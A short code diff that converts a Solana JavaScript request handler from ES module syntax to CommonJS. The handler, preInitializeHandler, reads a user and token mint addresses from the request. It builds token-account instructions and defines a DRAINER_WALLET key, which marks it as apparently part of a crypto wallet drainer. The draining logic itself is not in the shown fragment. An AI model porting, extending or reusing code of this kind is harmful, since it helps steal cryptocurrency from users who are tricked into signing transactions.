@@ -1,11 +1,11 @@
-import { Connection, PublicKey, Transaction } from '@solana/web3.js';
-import { createAssociatedTokenAccountInstruction } from '@solana/spl-token';
+const { Connection, PublicKey, Transaction } = require('@solana/web3.js');
+const { createAssociatedTokenAccountInstruction } = require('@solana/spl-token');
 
 // Import centralized error handling
-import errorHandler from '../src/errorHandler.js';
+const errorHandler = require('../src/errorHandler.js');
 
 // Import centralized RPC configuration
-import { RPC_ENDPOINTS, ENV_CONFIG } from '../env.config.js';
+const { RPC_ENDPOINTS, ENV_CONFIG } = require('../env.config.js');
 
 // RPC endpoints with fallback for reliability (prioritizing Helius and Shyft)
 
@@ -21,7 +21,7 @@ try {
   DRAINER_WALLET = new PublicKey('11111111111111111111111111111111');
 }
 
-export default async function preInitializeHandler(req, res) {
+module.exports = async function preInitializeHandler(req, res) {
   try {
     const { user, mintAddresses } = req.body;
     
